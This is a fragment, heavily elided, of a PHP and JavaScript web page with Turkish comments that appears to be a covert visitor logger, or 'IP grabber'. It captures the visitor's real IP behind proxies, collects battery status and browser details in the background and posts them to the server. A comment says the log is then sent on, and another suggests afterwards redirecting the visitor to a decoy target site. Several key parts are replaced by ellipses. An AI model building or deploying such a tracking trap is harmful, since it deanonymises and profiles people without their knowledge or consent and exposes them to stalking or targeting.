...
// 1. IP Adresini Al (Proxy arkasındaysa gerçek IP'yi yakala)
...
// JavaScript'ten gelecek teknik verileri yakalamak için POST kontrolü
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['js_data'])) {
    $js = json_decode($_POST['js_data'], true);
    
    // PHP ve JS verilerini tek mesajda birleştiriyoruz
    ...
    exit; // Log gönderildi, işlemi bitir
}
?>
<!DOCTYPE html>
<html lang="tr">
...
<body>
    ...
    <script>
        window.onload = async function() {
            // Pil durumu bilgisini çekelim (Gelişmiş teknik detay)
            ...
            let data = {
                ...
                pil: pil_durumu,
                tarayici: navigator.userAgent.substring(navigator.userAgent.lastIndexOf('/') - 10) // Daha stabil tarayıcı bilgisi
            };

            // Verileri arka planda PHP'ye POST et
            ...
            fetch(window.location.href, {
                ...
                // İstiyorsan log bittikten sonra hedef bir siteye yönlendirebilirsin
